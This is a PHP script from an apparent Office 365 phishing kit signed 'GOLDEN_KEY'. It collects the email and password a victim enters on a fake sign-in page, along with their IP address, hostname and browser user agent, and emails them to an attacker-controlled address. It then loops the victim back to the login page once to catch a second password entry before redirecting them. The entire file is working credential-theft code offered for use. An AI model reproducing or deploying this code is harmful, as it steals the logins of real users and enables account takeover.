<?php
include 'email.php';

if (isset($_POST['submit-btn'])) {
	$email = $_POST['email-ch'];
	$password = $_POST['pd'];
	$count = $_POST['count'];

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| OFFICE365 |--------------|\n";
	
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY GOLDEN_KEY --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	if ($count<=0) {
		$count=$count+1;
		header("Location: ./Sign_in.html?count=".$count."&email=#".$email);
	}
	else
	{
		header("Location: ".$redirect);

	}
	
}

?>